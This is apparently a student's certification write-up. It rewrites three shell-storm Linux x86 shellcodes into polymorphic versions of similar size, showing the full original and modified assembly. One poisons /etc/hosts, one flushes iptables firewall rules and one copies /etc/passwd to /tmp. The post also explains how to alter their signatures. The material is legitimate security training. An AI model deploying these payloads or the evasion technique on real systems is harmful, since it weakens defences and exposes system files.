---
layout: page
title: SLAE32 Assignment 6
---

<div class="well" markdown="1">
<h2>SLAE32 Assignment 6: Polymorphism</h2>

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-1009

For assignment 6, the instructions are to take 3 sample shellcodes from shell-storm.org and polymorphize them. They cannot be more than 150% the size of the original, and there are bonus points to be had if it is less in size than the original.

<h2>Shellcode 1</h2>
[Add Entry to Hosts to Point Google to 127.0.0.1](http://shell-storm.org/shellcode/files/shellcode-893.php)

This shellcode is 77 bytes, so the maximum length of the polymorphized version is 115 bytes.

Here is the original assembly of the shellcode:
```nasm
;77 bytes
_start:
    xor ecx, ecx
    mul ecx
    mov al, 0x5    
    push ecx
    push 0x7374736f     ;/etc///hosts
    push 0x682f2f2f
    push 0x6374652f
    mov ebx, esp
    mov cx, 0x401       ;permmisions
    int 0x80        ;syscall to open file

    xchg eax, ebx
    push 0x4
    pop eax
    jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    pop ecx
    push 20         ;length of the string, dont forget to modify if changes the map
    pop edx
    int 0x80        ;syscall to write in the file

    push 0x6
    pop eax
    int 0x80        ;syscall to close the file

    push 0x1
    pop eax
    int 0x80        ;syscall to exit

_load_data:
    call _write
    google db "127.1.1.1 google.com"
```

Here is my modified version of it:
```nasm
;76 bytes
_start:
    xor eax, eax
    add al, 0x5    
    jmp short _load_data ; load both strings in at once
_write:
    pop ebx
    lea edx, [ebx+11]
    xor byte [ebx+10],0xff ; null terminator
    mov ecx,eax
    mov cx, 0x401
    int 0x80        ;syscall to open file

    mov ebx,eax
    mov al,0x4
    xchg ecx,edx   ; put address of string into ecx
    add dl,19
    int 0x80        ;syscall to write in the file

    mov al,0x6     ; assume that the previous call succeeds and has 0x14 in the eax register
    int 0x80        ;syscall to close the file

    inc eax         ; assume call to close succeeds and eax is left with 0
    int 0x80        ;syscall to exit

_load_data:
    call _write
    data: db "/etc/hosts",0xff,"127.1.1.1 google.com"
```
One of the main differences that I introduced was to put all of the data at the end, and just use the offset of 11 to reference the second part. I also made some assumptions about the success of previous calls. I figured those were valid assumptions, as if they didn't succeed, the shellcode wouldn't work anyway.

One interesting thing I learned from this is that operations are smaller when working with eax as opposed to edx. So for example, I shaved one byte off by exchanging eax and edx first and then subtracting from eax.

Most importantly, I was able to reduce the overall size of the code from 77 bytes to 76 bytes!


<h2>Shellcode 2</h2>[/sbin/iptables --flush](http://shell-storm.org/shellcode/files/shellcode-554.php)

This shellcode is 69 bytes, so the maximum length of the polymorphized version is 103 bytes.

Here is the original assembly of the shellcode:
```nasm
;69 bytes
                xorl %eax,%eax
                xorl %ebx,%ebx
                movb $2, %al
                int $0x080
                cmpl %ebx,%eax
                jne WAIT

                xorl  %eax,%eax
                pushl %eax
                pushw $0x462d
                movl %esp,%esi
                pushl %eax
                pushl $0x73656c62
                pushl $0x61747069
                pushl $0x2f6e6962
                pushl $0x732f2f2f
                movl   %esp,%ebx
                leal   0x10(%esp),%edx
                pushl  %eax
                pushl  %esi
                pushl  %esp
                movl   %esp,%ecx
                movb   $0xb,%al
                int    $0x80

                WAIT:
                movl %eax, %ebx
                xorl %eax, %eax
                xorl %ecx, %ecx
                xorl %edx, %edx
                movb $7, %al
                int $0x80
```
First thing to do is convert it to intel format, as I am used to that now after this course. I echoed all the hex values from the original source, using the -ne option, and piped it to ndisasm to get the intel format.

```nasm
00000000  31C0              xor eax,eax
00000002  31DB              xor ebx,ebx
00000004  B002              mov al,0x2
00000006  CD80              int 0x80
00000008  39D8              cmp eax,ebx
0000000A  752D              jnz 0x39
0000000C  31C0              xor eax,eax
0000000E  50                push eax
0000000F  66682D46          push word 0x462d
00000013  89E6              mov esi,esp
00000015  50                push eax
00000016  68626C6573        push dword 0x73656c62
0000001B  6869707461        push dword 0x61747069
00000020  6862696E2F        push dword 0x2f6e6962
00000025  682F2F2F73        push dword 0x732f2f2f
0000002A  89E3              mov ebx,esp
0000002C  8D542410          lea edx,[esp+0x10]
00000030  50                push eax
00000031  56                push esi
00000032  54                push esp
00000033  89E1              mov ecx,esp
00000035  B00B              mov al,0xb
00000037  CD80              int 0x80
00000039  89C3              mov ebx,eax
0000003B  31C0              xor eax,eax
0000003D  31C9              xor ecx,ecx
0000003F  31D2              xor edx,edx
00000041  B007              mov al,0x7
00000043  CD80              int 0x80
```

Here is my modified version:
```nasm
;68 bytes
global _start

section .text
_start:
  xor ecx,ecx
  mul ecx
  add al,0x2
  int 0x80
  cmp eax,ecx
  jnz _wait

  ;xor eax,eax ; not necessary since this is the child process, so eax will be 0
  push ecx
  jmp short get_data
got_data:
  pop ebx
  xor byte [ebx+14],0xff
  xor byte [ebx+17],0xff
  mov edx,esp
  push edx
  lea ecx, [ebx+15]
  push ecx
  push ebx
  mov ecx,esp
  add al,0xb
  int 0x80

_wait:
  xor ebx,ebx
  xchg eax,ebx
  add al,0x7
  int 0x80

get_data:
  call got_data
  data: db "/sbin/iptables",0xff,"-F",0xff
```

The major change I made was to switch it to a jmp-call-pop version. I also used `xor ecx,ecx` and `mul ecx` to set more registers to 0, which allowed a great reduction in code for the parent process.

One interesting tip from this exercise was the command `set follow-fork-mode parent` in gdb, to allow you to follow the parent's execution or the child's.

Most importantly, I was able to reduce the overall size of the code from 69 bytes to 68 bytes!

<h2>Shellcode 3</h2>
[Copy /etc/passwd to /tmp/outfile](http://shell-storm.org/shellcode/files/shellcode-864.php)

This shellcode is 97 bytes, so the maximum length of the polymorphized version is 145 bytes.

Here is the original assembly of the shellcode:
```nasm
;97 bytes
global _start
section .text
_start:
    xor eax,eax
    mov al,0x5
    xor ecx,ecx
    push ecx
    push 0x64777373
    push 0x61702f63
    push 0x74652f2f
    lea ebx,[esp +1]
    int 0x80

    mov ebx,eax
    mov al,0x3
    mov edi,esp
    mov ecx,edi
    push WORD 0xffff
    pop edx
    int 0x80
    mov esi,eax

    push 0x5
    pop eax
    xor ecx,ecx
    push ecx
    push 0x656c6966
    push 0x74756f2f
    push 0x706d742f
    mov ebx,esp
    mov cl,0102o
    push WORD 0644o
    pop edx
    int 0x80

    mov ebx,eax
    push 0x4
    pop eax
    mov ecx,edi
    mov edx,esi
    int 0x80

    xor eax,eax
    xor ebx,ebx
    mov al,0x1
    mov bl,0x5
    int 0x80
```

Here is the assembly that I turned it into:
```nasm
;107 bytes
global _start
section .text

_start:
  xor    ecx,ecx
  mul    ecx
  add    al,0x5
  jmp    get_data

got_data:
  pop    esi
  xor    byte [esi+0xb],0xff
  mov    ebx,esi
  int    0x80

  xchg   ebx,eax
  mov    eax,ecx
  sub    al,0xfd
  not    dx
  sub    esp,edx
  mov    ecx,esp
  int    0x80

  mov    edi,eax
  lea    ebx,[esi+0xc]
  xor    byte [ebx+0xc],0xff
  xor    eax,eax
  add    eax,0x5
  xor    ecx,ecx
  add    cl,0x42
  xor    dx,0xff5b
  int    0x80

  xor    ebx,ebx
  xchg   ebx,eax
  add    eax,0x4
  xchg   edi,edx
  mov    ecx,esp
  int    0x80

  xor    eax,eax
  or     al,0x1
  mov    bl,0x5
  int    0x80

get_data:
  call   got_data
  data: db "/etc/passwd",0xff,"/tmp/outfile",0xff
```
I made lots of little changes, such as where I subtracted a negative number 0xfd to get the syscall for read into eax. I also did `not dx` instead of `mov dl,0xfff`, since I observed that it was already set to 0. I also turned it into a jmp-call-pop style to get the data altogether.

I did have to subtract enough room on the stack to fit the contents read from the file. Not even the original code was running correctly, as it was not reading any data from the file due to invalid memory. After making sure enough room was allocated on the stack, it worked fine.

I was not able to make this one smaller, but added 10 bytes to the shellcode length. Not smaller, but definitely under the 150% budget.
